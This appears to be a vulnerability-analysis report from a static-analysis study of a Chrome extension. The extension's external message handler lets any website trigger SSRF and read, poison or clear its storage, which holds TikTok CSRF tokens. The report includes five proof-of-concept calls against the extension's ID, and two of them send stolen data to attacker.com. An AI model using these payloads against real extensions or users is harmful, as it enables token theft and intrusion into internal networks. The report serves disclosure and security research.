# CoCo Analysis: cedkkgddfdhnlkkainimdeamjebkakfk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (CoCo reported chrome_storage_local_clear_sink, but analysis reveals additional vulnerabilities)

---

## Sink: chrome_runtime_MessageExternal → chrome_storage_local_clear_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cedkkgddfdhnlkkainimdeamjebkakfk/opgen_generated_files/bg.js
Line 1056: `chrome.storage.local.clear();`

**Code:**

```javascript
// Background script - External message handler (bg.js line 1005)
chrome.runtime.onMessageExternal.addListener(
  async (request, sender, sendResponse) => {
    if (request.url) { // ← SSRF vulnerability
      if (request.handleCors) {
        var res = await reqAPIhandleCore(request.url, request.method); // ← attacker-controlled URL
        sendResponse(res); // ← sends response back to attacker
      } else {
        var res = await reqAPI(
          request.url, // ← attacker-controlled URL
          request.method, // ← attacker-controlled method
          request.header, // ← attacker-controlled headers
          request.body // ← attacker-controlled body
        );
        sendResponse(res); // ← SINK: information disclosure - sends response back
      }
    } else if (request.storage) { // ← Storage operations
      switch (request.method) {
        case "get":
          let data = await getStorage(request.key); // ← attacker can read any storage key
          sendResponse(data); // ← SINK: information disclosure
          break;
        case "set":
          let res = await setStorage(request.key, request.value); // ← storage poisoning
          sendResponse(res);
          break;
        case "remove":
          sendResponse(removeStorage()); // ← calls storage.clear()
          break;
      }
    } else {
      sendResponse('{ "success": "true" }');
    }
    if (request.message) {
      sendResponse('{ "success": "true" }');
      return;
    }
  }
);

async function getStorage(keysave) {
  let data = await chrome.storage.local.get(keysave);
  data = data[keysave];
  return data; // ← returns storage value to external caller
}

async function setStorage(key, value) {
  chrome.storage.local.set({ [key]: value }); // ← writes attacker data to storage
  return "saved!";
}

async function removeStorage(key) {
  chrome.storage.local.clear(); // ← SINK: clears all storage
  return "remove all done";
}

async function reqAPI(url, method, header, body) {
  // Makes HTTP request with attacker-controlled parameters
  // and returns response to attacker
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from any website (externally_connectable matches all HTTP/HTTPS URLs)

**Attack:**

```javascript
// Attack 1: SSRF with information disclosure
chrome.runtime.sendMessage(
    'cedkkgddfdhnlkkainimdeamjebkakfk',
    {
        url: 'http://internal-server/admin/secrets',
        method: 'GET',
        handleCors: true
    },
    function(response) {
        console.log('Stolen data from internal server:', response);
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(response)
        });
    }
);

// Attack 2: Read sensitive storage data (e.g., CSRF tokens)
chrome.runtime.sendMessage(
    'cedkkgddfdhnlkkainimdeamjebkakfk',
    {
        storage: true,
        method: 'get',
        key: 'ad_csrftoken' // or 'bc_csrftoken'
    },
    function(token) {
        console.log('Stolen CSRF token:', token);
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify({token: token})
        });
    }
);

// Attack 3: Clear all extension storage (DoS)
chrome.runtime.sendMessage(
    'cedkkgddfdhnlkkainimdeamjebkakfk',
    {
        storage: true,
        method: 'remove'
    },
    function(response) {
        console.log('Storage cleared:', response);
    }
);

// Attack 4: Storage poisoning
chrome.runtime.sendMessage(
    'cedkkgddfdhnlkkainimdeamjebkakfk',
    {
        storage: true,
        method: 'set',
        key: 'ad_csrftoken',
        value: 'malicious_token_value'
    },
    function(response) {
        console.log('Storage poisoned:', response);
    }
);

// Attack 5: SSRF with POST request
chrome.runtime.sendMessage(
    'cedkkgddfdhnlkkainimdeamjebkakfk',
    {
        url: 'https://internal-api.tiktok.com/admin',
        method: 'POST',
        header: {'Content-Type': 'application/json'},
        body: JSON.stringify({malicious: 'payload'})
    },
    function(response) {
        console.log('SSRF response:', response);
    }
);
```

**Impact:** Multiple critical vulnerabilities:

1. **SSRF with Information Disclosure**: Any website can send arbitrary HTTP requests to any URL (including internal networks) with full control over method, headers, and body. The response is sent back to the attacker, enabling exfiltration of data from internal services, localhost, and intranet resources.

2. **Sensitive Data Exfiltration**: Attacker can read any storage key including TikTok CSRF tokens (ad_csrftoken, bc_csrftoken) that the extension captures via webRequest. These tokens can be used for session hijacking and unauthorized actions.

3. **Storage Manipulation**: Attacker can clear all storage (DoS) or poison storage with malicious values that may affect extension behavior.

4. **Complete Storage Exploitation Chain**: The extension allows complete storage.get → sendResponse flow, meeting the criteria for storage-based information disclosure.

The manifest allows externally_connectable from all HTTP/HTTPS URLs ("http://*/*", "https://*/*"), and per CoCo methodology, we treat this as exploitable by any attacker. The extension has host_permissions for <all_urls>, enabling SSRF to any domain.

---
